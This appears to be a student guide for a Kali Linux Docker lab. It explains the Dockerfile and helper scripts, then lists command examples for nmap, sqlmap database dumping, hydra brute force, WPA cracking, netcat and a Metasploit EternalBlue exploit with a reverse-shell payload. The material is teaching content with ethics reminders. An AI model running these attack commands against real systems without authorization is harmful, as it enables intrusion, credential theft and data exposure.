# Student Guide: Kali Linux Docker Environment

## Table of Contents
1. [How This Environment Was Created](#how-this-environment-was-created)
2. [Getting Started](#getting-started)
3. [Basic Kali Linux Commands for Ethical Hacking](#basic-kali-linux-commands-for-ethical-hacking)
4. [Common Workflows](#common-workflows)
5. [Tips and Best Practices](#tips-and-best-practices)

---

## How This Environment Was Created

Understanding how this environment is built will help you learn Docker and infrastructure concepts alongside ethical hacking.

### 1. Docker Basics

**What is Docker?**
Docker is a containerization platform that packages applications and their dependencies into isolated containers. Think of it as a lightweight virtual machine.

**Why Docker for Kali Linux?**
- **Isolation**: Your hacking tools are separated from your main system
- **Reproducibility**: Everyone gets the same environment
- **Portability**: Works on Windows, Mac, and Linux
- **Safety**: Easy to reset if something breaks
- **Resource Efficient**: Uses fewer resources than a full VM

### 2. The Dockerfile Explained

The `Dockerfile` is the blueprint for our Kali Linux environment. Here's what it does:

```dockerfile
FROM kalilinux/kali-rolling:latest
```
- Starts with the official Kali Linux base image
- "rolling" means it's continuously updated

```dockerfile
RUN apt-get update && apt-get upgrade -y
```
- Updates the package list and upgrades all packages

```dockerfile
RUN apt-get install -y nmap wireshark tcpdump ...
```
- Installs essential ethical hacking tools
- Each tool serves a specific purpose in penetration testing

```dockerfile
RUN useradd -m -s /bin/bash kali
```
- Creates a non-root user for security
- Running as root all the time is a bad security practice

```dockerfile
WORKDIR /home/kali
```
- Sets the default directory when you enter the container

### 3. Docker Compose Configuration

The `docker-compose.yml` file orchestrates the container:

```yaml
volumes:
  - ./workspace:/home/kali/workspace
```
- Maps your local `workspace` folder to the container
- Files here persist even when the container stops

```yaml
cap_add:
  - NET_ADMIN
  - NET_RAW
```
- Grants network capabilities needed for packet capture and network scanning
- More secure than running in full privileged mode

### 4. Helper Scripts

- **start.sh**: Builds the image and starts the container
- **stop.sh**: Stops the container
- **shell.sh**: Opens a terminal inside the container
- **root-shell.sh**: Opens a root terminal (use sparingly)

---

## Getting Started

### First Time Setup

1. **Install Docker** on your system:
   - Windows/Mac: Download Docker Desktop
   - Linux: Use your package manager

2. **Clone this repository**:
   ```bash
   git clone https://github.com/kakiac/kali-linux-docker.git
   cd kali-linux-docker
   ```

3. **Start the environment**:
   ```bash
   ./start.sh
   ```
   This will download and build everything (takes 10-15 minutes first time)

4. **Access the Kali shell**:
   ```bash
   ./shell.sh
   ```

### Your First Commands Inside Kali

Once inside the container, try these:

```bash
# Check your username
whoami

# Check your current directory
pwd

# List installed tools
dpkg -l | grep kali

# Check network interfaces
ip addr show

# Test internet connectivity
ping -c 4 8.8.8.8
```

---

## Basic Kali Linux Commands for Ethical Hacking

### 🔍 Information Gathering / Reconnaissance

#### 1. **nmap** - Network Scanner

The most popular network discovery and security auditing tool.

**Basic syntax**: `nmap [options] [target]`

```bash
# Quick scan of most common ports
nmap scanme.nmap.org

# Scan specific ports
nmap -p 80,443,22 scanme.nmap.org

# Scan all ports (1-65535)
nmap -p- scanme.nmap.org

# Detect service versions
nmap -sV scanme.nmap.org

# Detect operating system
sudo nmap -O scanme.nmap.org

# Aggressive scan (OS detection, version detection, script scanning, traceroute)
sudo nmap -A scanme.nmap.org

# Scan with script
nmap --script vuln scanme.nmap.org

# Save results to file
nmap scanme.nmap.org -oN output.txt
```

**Timing Options** (slower = stealthier):
```bash
nmap -T0  # Paranoid - very slow
nmap -T1  # Sneaky
nmap -T2  # Polite
nmap -T3  # Normal (default)
nmap -T4  # Aggressive - faster
nmap -T5  # Insane - very fast
```

#### 2. **whois** - Domain Information Lookup

Get registration information about a domain.

```bash
# Look up domain ownership
whois example.com

# Look up IP address owner
whois 8.8.8.8
```

#### 3. **dig** - DNS Lookup

Query DNS servers for information.

```bash
# Basic DNS lookup
dig example.com

# Get specific record types
dig example.com A      # IPv4 address
dig example.com AAAA   # IPv6 address
dig example.com MX     # Mail servers
dig example.com NS     # Name servers
dig example.com TXT    # Text records

# Short answer only
dig example.com +short

# Trace DNS resolution path
dig example.com +trace
```

#### 4. **netdiscover** - Active/Passive ARP Scanner

Discover hosts on a local network.

```bash
# Scan local network (passive)
sudo netdiscover -p

# Scan specific range
sudo netdiscover -r 192.168.1.0/24
```

### 🌐 Web Application Testing

#### 5. **nikto** - Web Server Scanner

Comprehensive web server scanner for vulnerabilities.

```bash
# Basic scan
nikto -h http://testphp.vulnweb.com

# Scan with specific port
nikto -h http://example.com:8080

# Scan HTTPS site
nikto -h https://example.com

# Save output
nikto -h http://testphp.vulnweb.com -o results.html -Format html
```

#### 6. **dirb** - Web Content Scanner

Brute force directories and files on web servers.

```bash
# Basic directory scan
dirb http://testphp.vulnweb.com

# Use custom wordlist
dirb http://testphp.vulnweb.com /usr/share/wordlists/dirb/common.txt

# Scan with specific extensions
dirb http://testphp.vulnweb.com -X .php,.txt,.html
```

#### 7. **sqlmap** - SQL Injection Tool

Automated SQL injection and database takeover tool.

```bash
# Test a URL parameter
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"

# Test with POST data
sqlmap -u "http://example.com/login.php" --data="username=admin&password=pass"

# List databases
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs

# Dump database
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D dbname --dump
```

#### 8. **curl** - Transfer Data from URLs

Make HTTP requests from command line.

```bash
# Basic GET request
curl http://example.com

# See headers
curl -I http://example.com

# Follow redirects
curl -L http://example.com

# POST request with data
curl -X POST http://example.com/api -d "param1=value1&param2=value2"

# Include cookies
curl -b "session=abc123" http://example.com

# Save to file
curl http://example.com -o output.html
```

### 🔓 Password Attacks

#### 9. **john** - John the Ripper

Password cracker that supports many hash types.

```bash
# Crack password hashes
john hashfile.txt

# Use specific wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt

# Show cracked passwords
john --show hashfile.txt

# Crack with rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashfile.txt
```

#### 10. **hydra** - Network Login Cracker

Brute force network login credentials.

```bash
# SSH brute force
hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# HTTP POST form
hydra -l admin -P passwords.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Multiple threads
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100
```

### 📡 Network Analysis

#### 11. **wireshark** - Network Protocol Analyzer

GUI tool for deep packet inspection.

```bash
# Start Wireshark
sudo wireshark
```

**Note**: Wireshark is graphical. Use `tshark` for command-line.

#### 12. **tcpdump** - Packet Capture

Command-line packet analyzer.

```bash
# Capture packets on interface
sudo tcpdump -i eth0

# Capture and save to file
sudo tcpdump -i eth0 -w capture.pcap

# Capture specific protocol
sudo tcpdump -i eth0 tcp
sudo tcpdump -i eth0 udp
sudo tcpdump -i eth0 icmp

# Capture specific port
sudo tcpdump -i eth0 port 80

# Capture specific host
sudo tcpdump -i eth0 host 192.168.1.100

# Read from file
tcpdump -r capture.pcap

# More verbose output
sudo tcpdump -i eth0 -v
sudo tcpdump -i eth0 -vv
sudo tcpdump -i eth0 -vvv
```

#### 13. **netcat (nc)** - Swiss Army Knife of Networking

Versatile networking tool for reading/writing network connections.

```bash
# Simple port scan
nc -zv 192.168.1.100 1-1000

# Connect to a service
nc example.com 80

# Listen on a port
nc -lvp 4444

# Transfer files
# On receiver: nc -lvp 4444 > received_file
# On sender: nc 192.168.1.100 4444 < file_to_send

# Simple chat
# Machine 1: nc -lvp 4444
# Machine 2: nc 192.168.1.100 4444

# Banner grabbing
echo "" | nc example.com 80
```

### 🔐 Wireless Attacks

#### 14. **aircrack-ng** - Wireless Security Tools

Suite of tools for WiFi network security assessment.

```bash
# Put interface in monitor mode
sudo airmon-ng start wlan0

# Scan for wireless networks
sudo airodump-ng wlan0mon

# Capture packets for specific network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Crack WEP key
aircrack-ng capture-01.cap

# Crack WPA/WPA2 with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

**Note**: Wireless attacks require a compatible wireless adapter.

### 💣 Exploitation

#### 15. **metasploit** - Penetration Testing Framework

Comprehensive framework for exploiting vulnerabilities.

```bash
# Start Metasploit console
msfconsole

# Inside msfconsole:
# Search for exploits
search type:exploit platform:windows

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set target
set RHOSTS 192.168.1.100

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50

# Run exploit
exploit

# Common Meterpreter commands (after successful exploit):
# sysinfo         - Get system information
# getuid          - Get current user
# shell           - Drop to system shell
# screenshot      - Take screenshot
# upload          - Upload file
# download        - Download file
```

### 🔬 Forensics & Analysis

#### 16. **binwalk** - Firmware Analysis Tool

Analyze and extract files from binary images.

```bash
# Scan file for embedded files
binwalk firmware.bin

# Extract found files
binwalk -e firmware.bin

# Signature scan with entropy analysis
binwalk -E firmware.bin
```

#### 17. **steghide** - Steganography Tool

Hide and extract data in image and audio files.

```bash
# Hide data in an image
steghide embed -cf image.jpg -ef secret.txt

# Extract hidden data
steghide extract -sf image.jpg

# Get info without extracting
steghide info image.jpg
```

#### 18. **strings** - Extract Text from Binary

Find printable strings in binary files.

```bash
# Basic usage
strings binary_file

# Only strings of length 10+
strings -n 10 binary_file

# Save to file
strings binary_file > output.txt
```

### 🐍 Python for Security

Python is essential for custom security tools.

```bash
# Start Python interactive shell
python3

# Run a Python script
python3 script.py

# Install Python security libraries
pip3 install scapy requests beautifulsoup4 paramiko
```

**Quick Python Examples:**

```python
# Simple port scanner
import socket

def scan_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((host, port))
    sock.close()
    return result == 0

# Test it
print(scan_port('scanme.nmap.org', 22))
```

```python
# HTTP request with requests library
import requests

response = requests.get('http://example.com')
print(response.status_code)
print(response.headers)
print(response.text)
```

---

## Common Workflows

### Workflow 1: Basic Penetration Testing Methodology

```bash
# 1. RECONNAISSANCE
# Gather information about target
whois target.com
dig target.com
nmap -sn 192.168.1.0/24

# 2. SCANNING
# Identify open ports and services
nmap -sV -sC target.com
nmap -p- target.com

# 3. ENUMERATION
# Get detailed information about services
nmap --script=vuln target.com
nikto -h http://target.com

# 4. VULNERABILITY ANALYSIS
# Identify weaknesses
msfconsole
search [service_name]

# 5. EXPLOITATION
# Attempt to exploit found vulnerabilities
use exploit/[path/to/exploit]
set RHOSTS target
exploit

# 6. POST-EXPLOITATION
# Gather information, maintain access
# (Within Meterpreter or shell)

# 7. REPORTING
# Document findings in workspace
cd /home/kali/workspace
nano pentest_report.txt
```

### Workflow 2: Web Application Assessment

```bash
# 1. Initial reconnaissance
curl -I http://target.com
whatweb http://target.com

# 2. Directory brute forcing
dirb http://target.com

# 3. Vulnerability scanning
nikto -h http://target.com

# 4. Manual testing
# Use browser or curl to test inputs

# 5. SQL injection testing
sqlmap -u "http://target.com/page.php?id=1"

# 6. Document findings
```

### Workflow 3: Network Analysis

```bash
# 1. Discover hosts
sudo netdiscover -r 192.168.1.0/24

# 2. Port scan discovered hosts
nmap -sV 192.168.1.0/24

# 3. Capture traffic
sudo tcpdump -i eth0 -w capture.pcap

# 4. Analyze with Wireshark
wireshark capture.pcap

# 5. Generate report
```

---

## Tips and Best Practices

### 1. Always Save Your Work

Your workspace is persistent, so use it:

```bash
# Create organized directories
cd /home/kali/workspace
mkdir project1 reports scans scripts

# Save scan results
nmap -sV target.com -oA project1/scan_results

# Keep notes
nano project1/notes.txt
```

### 2. Use Wordlists

Kali includes many wordlists:

```bash
# Locate wordlists
ls /usr/share/wordlists/

# rockyou.txt is popular but compressed
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Use in tools
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://target
```

### 3. Learn the Linux Basics

Essential Linux commands:

```bash
# Navigation
pwd          # Print working directory
ls -la       # List files (including hidden)
cd /path     # Change directory
cd ..        # Go up one directory
cd ~         # Go to home directory

# File operations
cat file.txt       # Display file contents
less file.txt      # View file with pagination
head file.txt      # Show first 10 lines
tail file.txt      # Show last 10 lines
grep "pattern" file.txt  # Search in file

# File management
cp source dest     # Copy file
mv source dest     # Move/rename file
rm file           # Remove file
mkdir dirname     # Create directory
chmod +x script.sh # Make file executable

# Process management
ps aux            # List all processes
top               # Real-time process viewer
kill PID          # Kill process by PID
killall name      # Kill process by name

# Network
ip addr show      # Show IP addresses
ping host         # Test connectivity
netstat -tulpn    # Show listening ports (sudo)
ss -tulpn         # Modern netstat alternative
```

### 4. Use History and Shortcuts

```bash
# View command history
history

# Repeat last command
!!

# Repeat command 5 from history
!5

# Search history (Ctrl+R)
# Type to search backwards through history

# Clear screen
clear
# or Ctrl+L

# Stop running command
# Ctrl+C

# Exit terminal
exit
# or Ctrl+D
```

### 5. Read Tool Documentation

```bash
# Get help for any tool
nmap --help
man nmap          # Full manual
nmap -h           # Quick help

# Search for installed packages
apt search keyword

# Install new tools
sudo apt update
sudo apt install tool-name
```

### 6. Practice Ethical Hacking

✅ **DO:**
- Get written permission before testing
- Use designated practice sites
- Document everything
- Report vulnerabilities responsibly
- Respect privacy and data

❌ **DON'T:**
- Scan or attack systems without permission
- Access data you're not authorized for
- Modify systems without authorization
- Use tools for malicious purposes
- Ignore laws and regulations

### 7. Legal Practice Targets

Safe places to practice:

- **scanme.nmap.org** - Nmap's testing server
- **testphp.vulnweb.com** - Intentionally vulnerable web app
- **HackTheBox.eu** - Legal hacking challenges
- **TryHackMe.com** - Guided learning platform
- **VulnHub.com** - Vulnerable VMs
- **OWASP WebGoat** - Insecure application for learning

### 8. Keep Learning

Resources for continuous learning:

- Official Kali documentation: https://www.kali.org/docs/
- Metasploit Unleashed: Free online course
- OWASP resources: Web security guides
- Security blogs and podcasts
- Capture The Flag (CTF) competitions
- Bug bounty programs (when ready)

---

## Troubleshooting Common Issues

### "Command not found"

```bash
# Update package list and install
sudo apt update
sudo apt install [package-name]

# Or search for the right package
apt search keyword
```

### "Permission denied"

```bash
# Use sudo for commands requiring elevated privileges
sudo command

# Or switch to root (temporarily)
sudo su -
```

### Lost in the File System

```bash
# Where am I?
pwd

# Go home
cd ~

# Go to workspace
cd /home/kali/workspace
```

### Container Not Starting

Exit the container and from your host:

```bash
# Stop container
./stop.sh

# Rebuild
docker-compose build --no-cache

# Start again
./start.sh
```

---

## Practice Exercises

### Exercise 1: Information Gathering
1. Use `whois` to look up github.com
2. Use `dig` to find GitHub's IP addresses
3. Use `nmap` to scan scanme.nmap.org
4. Document what you learned

### Exercise 2: Create a Port Scanner
Write a Python script that scans ports 1-100 on a target

### Exercise 3: Web Analysis
1. Use `nikto` on testphp.vulnweb.com
2. Use `dirb` to find directories
3. Use `curl` to examine HTTP headers
4. Write up your findings

### Exercise 4: Password Cracking Lab
1. Create test password hashes
2. Use `john` to crack them
3. Try different wordlists
4. Document crack times

---

## Questions?

- Review the main README.md
- Check Kali Linux documentation
- Ask your instructor
- Search online (but verify information!)

**Remember**: These are powerful tools. Use them responsibly and ethically! 🛡️

---

*Good luck with your ethical hacking journey!*
